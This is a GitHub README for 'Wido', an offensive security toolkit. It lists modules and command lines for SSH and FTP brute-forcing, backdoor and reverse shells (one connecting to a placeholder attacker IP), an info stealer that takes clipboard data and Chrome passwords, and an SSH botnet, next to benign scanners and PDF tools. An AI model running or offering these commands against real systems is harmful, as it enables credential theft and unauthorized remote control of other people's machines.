# 🛡️ Wido — Offensive Security Toolkit

<p align="left">
  <img src="https://img.shields.io/badge/Python-3.7+-blue?style=for-the-badge&logo=python&logoColor=white"/>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20Mac-lightgrey?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Type-Offensive%20Security-red?style=for-the-badge"/>
  <img src="https://img.shields.io/github/stars/Anil-kumar78/wido?style=for-the-badge&color=yellow"/>
</p>

**Wido** is a powerful, all-in-one offensive security toolkit built for ethical hackers, penetration testers, and cybersecurity professionals.

---

## ⚠️ Disclaimer

> **This tool is intended for educational purposes and authorized penetration testing ONLY.**
> Unauthorized use against systems you do not own or have explicit permission to test is **illegal**.
> The author is **not responsible** for any misuse or damage caused by this tool.

---

## 🛠️ Modules

| Module | Description |
|--------|-------------|
| 🔍 **Port Scanner** | Scan open ports on a target |
| 🔑 **Hash Cracker** | Crack MD5/SHA hashes using wordlists |
| 🔐 **SSH Brute-force** | Brute-force SSH login credentials |
| 📂 **FTP Brute-force** | Brute-force FTP login credentials |
| 🚪 **Backdoor Shell** | Server/Client backdoor shell |
| 🔄 **Backdoor Reverse Shell** | Reverse shell (server/client) |
| 🕵️ **Info Stealer** | Clipboard, system info, Chrome passwords |
| 🤖 **SSH Botnet** | Run commands on multiple SSH hosts |
| 🛡️ **Vulnerability Scanner** | Scan code/paths for vulnerabilities |
| 🌐 **Subdomain Finder** | Discover subdomains of a target domain |
| ✅ **Alive Subdomain Checker** | Check which subdomains are alive |
| 🔒 **PDF Protection** | Add password protection to a PDF |
| 🔓 **PDF Cracker** | Crack PDF password using wordlist |
| 📡 **Network Scanner** | Ping sweep to discover live hosts |

---

## 📦 Installation

```bash
# 1. Clone the repository
git clone https://github.com/Anil-kumar78/wido.git
cd wido

# 2. Install dependencies
pip install -r requirements.txt
pip install paramiko pyperclip psutil PyPDF2
```

---

## 🚀 Usage

Show all available modules and help:

```bash
python wido.py --help
```

---

## 📋 Example Commands

### 🔍 Port Scanner
```bash
python wido.py port-scan --target 192.168.1.1 --ports 22,80,443,8000-8100 --workers 200
```

### 🔑 Hash Cracker
```bash
python wido.py hash-crack --hashes hashes.txt --wordlist rockyou.txt
```

### 🔐 SSH Brute-force
```bash
python wido.py ssh-brute --host 192.168.1.2 --user root --wordlist pass.txt
```

### 📂 FTP Brute-force
```bash
python wido.py ftp-brute --host 192.168.1.3 --user admin --wordlist pass.txt
```

### 🚪 Backdoor Server
```bash
python wido.py backdoor-server --port 4444
```

### 🚪 Backdoor Client
```bash
python wido.py backdoor-client --host 1.2.3.4 --port 4444
```

### 🔄 Reverse Shell — Server
```bash
python wido.py backdoor-reverse-server --port 4444
```

### 🔄 Reverse Shell — Client
```bash
python wido.py backdoor-reverse-client --host <attacker_ip> --port 4444
```

### 🕵️ Info Stealer
```bash
python wido.py info-stealer
```

### 🤖 SSH Botnet
```bash
python wido.py ssh-botnet --hosts hosts.txt --command "ls -la" --user root --password mypass
```

### 🛡️ Vulnerability Scanner
```bash
python wido.py vuln-scan --path ./code
```

### 🌐 Subdomain Finder
```bash
python wido.py subdomain --domain example.com
```

### ✅ Alive Subdomains
```bash
python wido.py alive-subdomains --input subdomains.txt --output alive.txt
```

### 🔒 PDF Protection
```bash
python wido.py pdf-protect --input file.pdf --output protected.pdf --password secret
```

### 🔓 PDF Cracker
```bash
python wido.py pdf-crack --input protected.pdf --wordlist words.txt
```

### 📡 Network Scanner
```bash
python wido.py network-scan --subnet 192.168.1.0/24
```

---

## 📁 Project Structure

```
wido/
├── wido.py               # Main entry point
├── scanner.py            # Vulnerability & subdomain scanner
├── subdomain_finder.py   # Subdomain discovery module
├── alive_subdomain.py    # Alive subdomain checker
├── config.json           # Configuration file
├── requirements.txt      # Python dependencies
└── README.md             # Project documentation
```

---

## ⚙️ Requirements

- **Python 3.7+**
- Standard libraries: `socket`, `subprocess`, `hashlib`, `ftplib`, `argparse`

```bash
pip install paramiko pyperclip psutil PyPDF2
```

| Library | Purpose |
|---------|---------|
| `paramiko` | SSH features (brute-force, botnet) |
| `pyperclip` | Clipboard access in info-stealer |
| `psutil` | System info in info-stealer |
| `PyPDF2` | PDF protect & crack features |

---

## 🤝 Contributing

Contributions are welcome! Feel free to:
- 🐛 Submit bug reports via [Issues](https://github.com/Anil-kumar78/wido/issues)
- 💡 Request new features
- 🔀 Open a Pull Request

---

## 👨‍💻 Author

**Anil Kumar**
- GitHub: [@Anil-kumar78](https://github.com/Anil-kumar78)

---

<p align="center">Made with ❤️ for the cybersecurity community</p>
<p align="center">⭐ Star this repo if you find it useful!</p>